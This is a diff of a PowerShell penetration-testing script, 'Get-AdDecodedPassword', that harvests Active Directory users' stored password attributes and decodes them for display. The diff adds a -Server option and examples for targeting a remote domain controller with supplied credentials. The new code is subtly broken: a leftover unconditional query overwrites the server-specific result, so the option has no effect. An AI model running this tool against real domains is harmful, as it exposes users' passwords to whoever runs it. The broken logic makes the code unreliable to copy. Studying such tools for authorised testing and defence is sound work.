@@ -1,36 +1,60 @@
 <#
  Author: Scott Sutherland (@_nullbind), NetSPI
- 
- Version: 0.0.3
+ Version: 0.0.4
  
  Description
  This script uses the Active Directory Powershell Module to query Active Directory
  for users with the UnixUserPassword, UserPassword, unicodePwd, or msSFU30Password properties
  populated.  It then decodes those password fields and displays them to the user.
 
+ .PARAMETER Server
+
+ Specify the domain controller to search for.
+ Default's to the users current domain.
+ 
+ .PARAMETER Verbose
+
+ Verbose Information
+
  This script is based on information shared in the blog below.
  Reference: https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
  
  Example 1: Run on domain system as domain user.
  Get-AdDecodedPassword -Verbose
-  
+
  Example 2: Run on non-domain system and target a remote domain controller with provided credentials
  New-PSDrive -PSProvider ActiveDirectory -Name RemoteADS -Root "" -Server a.b.c.d -credential domain\user
  cd RemoteADS:
  Get-AdDecodedPassword -Verbose
+ 
+ Example 3: Run on non-domain system and target a remote domain controller with provided credentials.
+ First: runas /netonly /user:domain\user powershell
+ A new powershell window will be open. In the new powershell we have the token of the user that it will be used for network resources (SMB,LDAP)
+ Second: Import-Module Get-AdDecodedPassword.psm; Get-AdDecodedPassword -Verbose -Server a.b.c.d
+
 #>
 
 Function Get-AdDecodedPassword
 {
 
     [CmdletBinding()]
-    Param()    
+    Param(
+        [String]
+        $Server
+    )    
 
     # Import the AD PS module
     #Import-Module ActiveDirectory  
                 
     # Get domain users with populated UnixUserPassword properties
     Write-Verbose "Getting list of domain accounts and properties..."
+    if ($Server -ne $null) {
+        $EncodedUserPasswords = Get-AdUser -Filter * -Properties * -Server $Server |
+        Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password, os400-password
+    }else{
+        $EncodedUserPasswords = Get-AdUser -Filter * -Properties * |
+        Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password, os400-password
+    }
     $EncodedUserPasswords = Get-AdUser -Filter * -Properties * |
     Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password, os400-password
 
